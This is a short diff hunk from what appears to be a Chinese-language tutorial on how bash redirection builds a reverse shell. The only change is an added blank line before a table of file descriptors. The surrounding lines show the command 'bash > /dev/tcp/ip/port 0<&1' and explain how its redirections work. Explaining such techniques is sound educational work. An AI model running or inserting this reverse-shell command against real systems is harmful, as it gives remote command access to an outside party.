@@ -39,6 +39,7 @@ bash > /dev/tcp/ip/port 0<&1
 ```
 先是`standout`重定向到`/dev/tcp/ip/port`，接着`standin`的再被复制成`standout`
 > 这儿说的standin,standout并非是指针，而是0,1的默认名称
+
 |Handle|Name|Description|
 | - | - | - |
 |0|stdin|标准输入|
